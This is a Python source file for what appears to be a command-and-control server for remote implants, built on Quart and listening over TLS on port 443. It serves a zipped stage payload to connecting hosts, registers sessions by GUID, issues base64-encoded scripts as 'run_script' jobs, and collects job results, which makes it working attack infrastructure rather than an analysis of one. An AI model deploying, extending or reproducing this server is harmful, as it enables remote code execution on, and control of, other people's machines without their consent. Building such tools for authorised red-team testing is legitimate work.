import ssl
import base64
import json
import random
import string
import asyncio
import sys
from io import BytesIO
from zipfile import ZipFile, ZIP_DEFLATED
from pprint import pprint
from quart import Quart, websocket, request, jsonify, Response, copy_current_request_context, send_file

app = Quart(__name__)

def gen_random_string(length=8):
    return ''.join(random.sample(string.ascii_letters, int(length)))

@app.route('/stage.zip', methods=['GET'])
async def stage():
    stage = BytesIO()
    with open('../data/stage.zip', 'rb') as zip_file:
        stage.write(zip_file.read())

    with ZipFile(stage, 'a', compression=ZIP_DEFLATED, compresslevel=9) as zip_file:
        zip_file.write("../data/stage.py", arcname="Main.py")

    print(f'Sending stage ({sys.getsizeof(stage)} bytes) ->  {request.remote_addr} ...')

    return Response(stage.getvalue(), content_type='application/zip')

@app.route('/<GUID>', methods=['POST'])
async def first_checkin(GUID):
    print(f"New session {GUID} connected! ({request.remote_addr})")
    data = json.loads(await request.data)
    pprint(data)

    return jsonify({}), 200

@app.route('/<GUID>/jobs', methods=['GET'])
async def jobs(GUID):
    print(f"Session {GUID} ({request.remote_addr}) checked in ...")
    #print(f"No jobs to give {GUID}")
    with open('../modules/src/job.py', 'rb') as script:
        data = base64.b64encode(script.read()).decode()
        return jsonify({'id': gen_random_string(), 'command': 'run_script', 'args': 'test', 'data': data}), 200

@app.route('/<GUID>/jobs/<job_id>', methods=['POST'])
async def job_result(GUID, job_id):
    print(f"Session {GUID} posted results of job {job_id}")
    data = json.loads(await request.data)
    pprint(data)

    return jsonify({}), 200

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST'])
async def unknown_path(path):
    print(f"Unknown path: {path}")
    return jsonify({}), 404

"""
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
async def ws(path):
    while True:
        await websocket.send('hello')
"""

if __name__ == '__main__':
    ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ssl_context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_COMPRESSION
    ssl_context.set_ciphers('ECDHE+AESGCM')
    ssl_context.load_cert_chain(certfile='../data/cert.pem', keyfile='../data/key.pem')
    ssl_context.set_alpn_protocols(['h2', 'http/1.1'])

    #ssl_context_http2 = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    #ssl_context_http2.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_COMPRESSION
    #ssl_context_http2.set_ciphers('ECDHE+AESGCM')
    #ssl_context_http2.load_cert_chain(certfile='cert.pem', keyfile='key.pem')
    #ssl_context_http2.set_alpn_protocols(['h2', 'http/1.1'])

        #asyncio.set_event_loop(asyncio.new_event_loop())
        #app.run(host='0.0.0.0', port=5000, ssl=ssl_context_http2, use_reloader=False)

    #t = Process(target=http2_thread, daemon=True)
    #t.start()

    app.run(host='0.0.0.0', port=443, ssl=ssl_context, use_reloader=True)
